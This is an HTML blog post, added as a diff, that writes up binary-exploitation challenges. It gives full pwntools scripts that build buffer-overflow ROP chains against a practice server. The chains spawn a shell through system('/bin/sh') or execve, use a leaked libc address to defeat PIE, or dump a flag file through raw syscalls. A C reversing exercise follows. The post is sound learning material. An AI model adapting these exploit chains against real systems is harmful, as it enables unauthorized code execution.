@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Using ROP technique to exploit binaries really makes you realize how amazing the &#39;pop&#39; instruction is">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pop Instructions Should be Illegal">
+<meta property="og:url" content="http://atharvdamle.com/rop-n-pop/index.html">
+<meta property="og:site_name" content="Atharv&#39;s Blog">
+<meta property="og:description" content="Using ROP technique to exploit binaries really makes you realize how amazing the &#39;pop&#39; instruction is">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-07-19T19:10:31.582Z">
+<meta property="article:modified_time" content="2022-03-09T15:44:12.418Z">
+<meta property="article:author" content="Atharv Damle">
+<meta property="article:tag" content="Code">
+<meta property="article:tag" content="Binary Exploitation">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Pop Instructions Should be Illegal</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/heaping-on/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/fgets-misuses/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://atharvdamle.com/rop-n-pop/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://atharvdamle.com/rop-n-pop/&text=Pop Instructions Should be Illegal"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://atharvdamle.com/rop-n-pop/&title=Pop Instructions Should be Illegal"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://atharvdamle.com/rop-n-pop/&is_video=false&description=Pop Instructions Should be Illegal"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Pop Instructions Should be Illegal&body=Check out this article: http://atharvdamle.com/rop-n-pop/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://atharvdamle.com/rop-n-pop/&title=Pop Instructions Should be Illegal"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://atharvdamle.com/rop-n-pop/&title=Pop Instructions Should be Illegal"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://atharvdamle.com/rop-n-pop/&title=Pop Instructions Should be Illegal"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://atharvdamle.com/rop-n-pop/&title=Pop Instructions Should be Illegal"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://atharvdamle.com/rop-n-pop/&name=Pop Instructions Should be Illegal&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://atharvdamle.com/rop-n-pop/&t=Pop Instructions Should be Illegal"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#swrop"><span class="toc-number">1.</span> <span class="toc-text">swrop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#static"><span class="toc-number">2.</span> <span class="toc-text">static</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#roproprop"><span class="toc-number">3.</span> <span class="toc-text">roproprop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ropme"><span class="toc-number">4.</span> <span class="toc-text">ropme</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#re-c"><span class="toc-number">5.</span> <span class="toc-text">re.c</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">6.</span> <span class="toc-text">Conclusion</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Pop Instructions Should be Illegal
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Atharv Damle</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-07-19T19:10:31.582Z" itemprop="datePublished">2020-07-19</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Binary-Exploitation/" rel="tag">Binary Exploitation</a>, <a class="tag-link-link" href="/tags/Code/" rel="tag">Code</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="swrop"><a href="#swrop" class="headerlink" title="swrop"></a>swrop</h2><hr>
+<p>FLAG{REDACTED}</p>
+<hr>
+<p>Simple W(??) rop. For this one all we need is to redirect code execution, using a simple buffer overflow. Only difference is that there is no <code>win</code> function.</p>
+<ol>
+<li>The <code>system</code> call is already in the <code>not_call</code> function</li>
+<li><code>/bin/sh</code> is in the data region for some reason.</li>
+</ol>
+<p>With that in mind, we call <code>system</code>, putting the address to <code>/bin/sh</code> at the top of the stack.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./swrop&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;plsdonthaq.me&#x27;</span>, <span class="number">6001</span>)</span><br><span class="line"></span><br><span class="line">padding = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x88</span></span><br><span class="line">binsh = p32(<span class="number">0x080485f0</span>)</span><br><span class="line">system = p32(<span class="number">0x080484ed</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(padding + system + binsh)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="static"><a href="#static" class="headerlink" title="static"></a>static</h2><hr>
+<p>FLAG{REDACTED}</p>
+<hr>
+<p>Graduating from a single rop gadget, we move to larger rop chains. The goal in this one was to pop a shell.<br>Since it is a statically compiled binary, we have a lot of rop gadgets to play with. While there is no <code>/bin/sh</code>, the pointer to the buffer we overflow is put loaded into <code>eax</code> after the call.</p>
+<ol>
+<li>As the buffer is read in using fgets, we can simulate the string by putting <code>/bin/sh\x00</code> into the buffer. This way, the “string” in the buffer is only 8 bytes long.</li>
+<li>Set the registers appropriately as:<ol>
+<li><code>eax = 0xb</code> —&gt; execve</li>
+<li><code>ebx = &lt;address of the buffer&gt;</code> —&gt; <code>/bin/sh\x00</code></li>
+<li><code>ecx = 0</code></li>
+<li><code>edx = 0</code></li>
+</ol>
+</li>
+<li>Run a syscall using <code>int 0x80</code></li>
+<li><code>cat flag</code></li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./static&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;plsdonthaq.me&#x27;</span>, <span class="number">6002</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># put binsh at the front of the buffer</span></span><br><span class="line">binsh = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">padding = <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># set eax</span></span><br><span class="line">eaxEdit = p32(<span class="number">0x08091f17</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># set ecx</span></span><br><span class="line">ecxEdit = p32(<span class="number">0x0806b32c</span>)</span><br><span class="line">ecxEdit2 = p32(<span class="number">0x080c49cf</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># set edx</span></span><br><span class="line">edxEdit1 = p32(<span class="number">0x080562ab</span>)</span><br><span class="line">edxEdit2 = p32(<span class="number">0x0809c216</span>)</span><br><span class="line">edxPadding = <span class="string">b&#x27;A&#x27;</span>*<span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># int 0x80</span></span><br><span class="line">syscall = p32(<span class="number">0x08049533</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># mov ecx, eax</span></span><br><span class="line">movEaxToEdi = p32(<span class="number">0x0806af9d</span>)</span><br><span class="line">movEdiToEdx = p32(<span class="number">0x0809c216</span>)</span><br><span class="line">movEdxToEbx = p32(<span class="number">0x0806d956</span>)</span><br><span class="line">movEdiToEdxPadding = <span class="string">b&#x27;A&#x27;</span> * <span class="number">12</span></span><br><span class="line"></span><br><span class="line">p.sendline(binsh + padding + movEaxToEdi + movEdiToEdx</span><br><span class="line">        + movEdiToEdxPadding + movEdxToEbx</span><br><span class="line">        + ecxEdit + ecxEdit2 + edxEdit1</span><br><span class="line">        + edxEdit2 + edxPadding + eaxEdit</span><br><span class="line">        + <span class="string">b&#x27;AAAA&#x27;</span> + syscall)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="roproprop"><a href="#roproprop" class="headerlink" title="roproprop"></a>roproprop</h2><hr>
+<p>FLAG{REDACTED}</p>
+<hr>
+<p>This one was very similar to the previous one, except it has PIE enabled, and is dynamically linked.</p>
+<ol>
+<li>Dynamically linked, means that there aren’t enough rop gadgets to easily make a chain.</li>
+<li>PIE means that we need to calculate the actual addresses of the rop gadgets by offsetting them with the address of libc-base</li>
+</ol>
+<p>Fortunately, we have a pointer into a libc leaked to us. Turns out, it points to the <code>setbuf</code> function. In that case, all we need is to calculate the start of libc by subtracting the offset to <code>setbuf</code> from it. Since the exact version of libc is provided, we can use that to get the offset of <code>setbuf</code> and calculate the value of libc-base. After that we can simply offset each of the rop gadgets found in libc with the libc base calculated at runtime and pop a shell using the method from static.</p>
+<p><strong>Did I mention <code>pop</code> instructions are too amazing?</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./roproprop&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;plsdonthaq.me&#x27;</span>, <span class="number">6003</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.readuntil(<span class="string">&#x27;- &#x27;</span>)</span><br><span class="line">libc_ptr = <span class="built_in">int</span>(p.readuntil(<span class="string">&#x27; -&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">libc_base = libc_ptr - <span class="number">0x00065ff0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getLibcAddress</span>(<span class="params">offset</span>):</span><br><span class="line">	<span class="keyword">return</span> p32(libc_base + offset)</span><br><span class="line"></span><br><span class="line">padding = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x4ca</span></span><br><span class="line">retPad = <span class="string">b&#x27;BBBB&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pop ebx</span></span><br><span class="line">binsh = getLibcAddress(<span class="number">0x0015ba0b</span>)</span><br><span class="line">rop1 = getLibcAddress(<span class="number">0x00018395</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pop ecx; pop edx;</span></span><br><span class="line">rop2 = getLibcAddress(<span class="number">0x0002bc6c</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># mov eax, 4</span></span><br><span class="line">rop4 = getLibcAddress(<span class="number">0x000a05d0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add eax, 7</span></span><br><span class="line">rop5 = getLibcAddress(<span class="number">0x0013fd0f</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># int 0x80</span></span><br><span class="line">rop6 = getLibcAddress(<span class="number">0x00002c87</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(padding + retPad</span><br><span class="line">		+ rop1 + binsh + rop2 + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + rop4 + rop5 + rop6)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="ropme"><a href="#ropme" class="headerlink" title="ropme"></a>ropme</h2><hr>
+<p>FLAG{REDACTED}</p>
+<hr>
+<p>The final rop challenge.<br>I’m sure there’s a way to run <code>puts(&lt;puts@plt&gt;)</code>, leaking libc, but unlike the previous challenges, I simply used the read and write syscalls to dump the flag instead of trying to pop a shell.</p>
+<p>Interestingly, because of how the program works, the flag file is bound to be opened in the next available file descriptor: <code>3</code> (after <code>stdin</code>, <code>stdout</code> and <code>stderr</code>). Exploiting this fact, we can dump the <code>flag</code> file without a shell.</p>
+<p><strong>Notes:</strong></p>
+<ol>
+<li>What you want to be careful is not to put too many bytes into the stream, so you don’t end up going beyond the possible number of bytes the program can take in before you crash it. The payload is fairly large, and the “buffer” rather small at only 8 bytes.</li>
+<li>On the flip-side, you also need to remember that you’re overwriting the buffer you’re putting the rop chain in, so you need to make sure that the next rop instruction is not accidently overwritten. This probably won’t happen because all the rop gadgets are 4 bytes long, whereas the instruction inside: <code>add edx, 1; ret;</code> only adds one byte the total number of characters to write.</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./ropme&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;plsdonthaq.me&#x27;</span>, <span class="number">6004</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ecx is set</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mov edx, 0</span></span><br><span class="line">zeroEdx = p32(<span class="number">0x080484ef</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add edx, 1</span></span><br><span class="line">addEdx = p32(<span class="number">0x080484fc</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ebx</span></span><br><span class="line">setEbx = zeroEdx + addEdx + p32(<span class="number">0x08048502</span>)</span><br><span class="line">setEbx2 = p32(<span class="number">0x08048420</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># mov eax, 3</span></span><br><span class="line">setEax = zeroEdx + addEdx + addEdx + addEdx + p32(<span class="number">0x08048500</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># mov eax, 4</span></span><br><span class="line">setEax2 = zeroEdx + addEdx + addEdx + addEdx + addEdx + p32(<span class="number">0x08048500</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># int 0x80</span></span><br><span class="line">syscall = p32(<span class="number">0x080484f2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 8 bytes in the buffer + ebp</span></span><br><span class="line">padding = <span class="string">b&#x27;A&#x27;</span> * <span class="number">12</span></span><br><span class="line"></span><br><span class="line">p.sendline(padding + setEax + (addEdx * <span class="number">100</span>)</span><br><span class="line">        + syscall + setEax2 + setEbx</span><br><span class="line">        + (addEdx * <span class="number">100</span>) + syscall)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="re-c"><a href="#re-c" class="headerlink" title="re.c"></a>re.c</h2><hr>
+<a href="/rop-n-pop/re.c" title="re.c">re.c</a>
+
+<p><em>Can’t believe I was having difficulty introducing a bug</em></p>
+<p>This was an interesting reversing challenge. A first with IDA, hopefully the last. Why does it not have dark mode lol.</p>
+<p>It was fun trying to recognize and understand the struct linked list pattern. The program loops until the counter is greater than 9, creating one node in the list on every iteration. There is a check to see if the <code>malloc</code> worked properly. What was particularly amusing is that the list is created backwards. So the linked list would look like <code>...E -&gt; D -&gt; C -&gt; B -&gt; A -&gt; NULL</code> instead of the opposite. Arguably, you don’t need the if statement in the loop, but I guess it adds to the challenge.<br>If I was confused about something it would be as to why the struct in memory looks like</p>
+<blockquote>
+<p><code>&lt;char: 1 byte&gt; + &lt;padding: 3 bytes&gt; + &lt;next pointer: 4 bytes&gt;</code></p>
+</blockquote>
+<p>instead of</p>
+<blockquote>
+<p><code>&lt;next pointer: 4 bytes&gt; + &lt;char: 1 byte&gt;</code></p>
+</blockquote>
+<p>but perhaps this gets removed when (and if) the binary is optimized.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">linkedList</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> letter;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">linkedList</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> linkedList * <span class="title function_">new</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">linkedList</span> *<span class="title">head</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">linkedList</span> *<span class="title">tail</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (i &lt;= <span class="number">9</span>) &#123;</span><br><span class="line">        head = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> linkedList));</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (tail == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            tail = head;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            head -&gt; next = tail;</span><br><span class="line">            tail = head;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Remove this line to fix the program lol</span></span><br><span class="line">        head -&gt; next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        head -&gt; letter = <span class="string">&#x27;A&#x27;</span> + i;</span><br><span class="line">        i += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tail;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><hr>
+<p>Ropped</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#swrop"><span class="toc-number">1.</span> <span class="toc-text">swrop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#static"><span class="toc-number">2.</span> <span class="toc-text">static</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#roproprop"><span class="toc-number">3.</span> <span class="toc-text">roproprop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ropme"><span class="toc-number">4.</span> <span class="toc-text">ropme</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#re-c"><span class="toc-number">5.</span> <span class="toc-text">re.c</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">6.</span> <span class="toc-text">Conclusion</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://atharvdamle.com/rop-n-pop/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://atharvdamle.com/rop-n-pop/&text=Pop Instructions Should be Illegal"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://atharvdamle.com/rop-n-pop/&title=Pop Instructions Should be Illegal"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://atharvdamle.com/rop-n-pop/&is_video=false&description=Pop Instructions Should be Illegal"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Pop Instructions Should be Illegal&body=Check out this article: http://atharvdamle.com/rop-n-pop/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://atharvdamle.com/rop-n-pop/&title=Pop Instructions Should be Illegal"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://atharvdamle.com/rop-n-pop/&title=Pop Instructions Should be Illegal"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://atharvdamle.com/rop-n-pop/&title=Pop Instructions Should be Illegal"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://atharvdamle.com/rop-n-pop/&title=Pop Instructions Should be Illegal"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://atharvdamle.com/rop-n-pop/&name=Pop Instructions Should be Illegal&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://atharvdamle.com/rop-n-pop/&t=Pop Instructions Should be Illegal"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
